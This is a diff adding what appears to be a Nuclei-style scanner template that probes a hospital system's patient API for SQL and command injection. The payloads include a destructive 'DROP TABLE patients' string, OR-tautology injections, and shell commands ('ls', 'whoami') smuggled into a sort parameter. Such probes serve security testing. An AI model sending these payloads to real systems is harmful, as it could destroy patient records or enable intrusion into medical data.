@@ -1,0 +1,70 @@
+id: kis-injection
+info:
+  name: KIS Injection
+  severity: critical
+  tags: injection,sql,kis
+  description: Testet SQL-Injection und Command Injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/patients?name=test'--"
+      - "{{BaseURL}}/api/v1/patients?name=test'; DROP TABLE patients;--"
+      - "{{BaseURL}}/api/v1/patients?search=test' OR '1'='1"
+      - "{{BaseURL}}/api/v1/patients?filter=id=1' AND '1'='1"
+    
+    headers:
+      Authorization: "Bearer {{ACCESS_TOKEN}}"
+    
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "error"
+          - "SQL"
+          - "syntax"
+          - "query"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/patients"
+    
+    body: |
+      {"name":"test'--","address":"test'}"}
+    
+    headers:
+      Authorization: "Bearer {{ACCESS_TOKEN}}"
+      Content-Type: "application/json"
+    
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "error"
+          - "SQL"
+          - "syntax"
+        condition: and
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/patients?sort=name;ls"
+      - "{{BaseURL}}/api/v1/patients?sort=name|whoami"
+    
+    headers:
+      Authorization: "Bearer {{ACCESS_TOKEN}}"
+    
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root"
+          - "admin"
+          - "total"
+        condition: and
